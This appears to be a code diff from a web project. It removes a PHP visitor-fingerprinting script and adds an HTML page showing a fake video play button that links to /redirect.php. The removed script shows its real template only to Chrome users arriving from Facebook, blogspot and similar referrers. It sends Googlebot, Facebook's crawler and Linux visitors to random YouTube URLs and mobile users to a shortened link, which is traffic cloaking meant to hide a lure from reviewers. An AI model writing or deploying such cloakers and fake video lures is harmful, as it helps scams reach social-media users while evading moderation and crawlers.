@@ -1,53 +1,17 @@
-<?php
-  $action = "theme";
-  require_once('Mobile_Detect.php');
-  require_once('Browser.php');
-  $detect = new Mobile_Detect;
-  $browser = new Browser();
-
-  if($detect->isMobile() || $browser->isMobile()){
-    $action = "mobile";
-  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
-    $action = "theme";
-  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
-    $action = "theme";
-  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
-    $action = "site";
-  }
-
-  if($action == "site"){
-    $_SERVER["HTTP_REFERER"] = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
-    $refs = array('facebook.com', 'uye.io', 'storage.googleapis.com', 'blogspot.');
-    $action = "theme";
-    foreach ($refs as $ref) {
-      if(strpos($_SERVER["HTTP_REFERER"], $ref) !== false){
-        $action = "site";
-        break;
-      }
-    }
-  }
-
-  function generate_name($length){
-      $rname = "";
-      $sesli = "aeiou";
-      $sessiz = "bcdfghjklmnprstvyz";
-      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
-      for($n=0;$n<$length;$n++){
-          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
-              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
-          }else{
-              $rname .= $sesli[rand(0,strlen($sesli)-1)];
-          }
-      }
-      return $rname;
-  }
-  
-  if($action == "mobile"){
-    header("Location: http://goo.gl/c1u740");
-  }else if($action == "site"){
-    require_once("template.php");
-  }else{
-    header("HTTP/1.1 301");
-    header("Location:https://www.youtube.com/watch?v=".generate_name(rand(8,9));
-  }
-?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Video</title>
+	<style type="text/css">
+		body{
+          background: #e9eaed;
+          text-align: center;
+          margin: 0;
+        }
+	</style>
+</head>
+<body>
+<a href="/redirect.php"><svg id="play" style="min-width: 200px; width: 16%; overflow: auto; margin: auto; position: absolute; top: 0; left: 0; bottom: 0; right: 0; opacity: 0.8;" version="1.1" viewBox="0 0 40 40">
+<path class="ytp-svg-fill" d="m 12.22,28.88 0,-17.77 16.66,8.91 -16.66,8.86 z" style=""></path></svg></a>
+</body>
+</html>
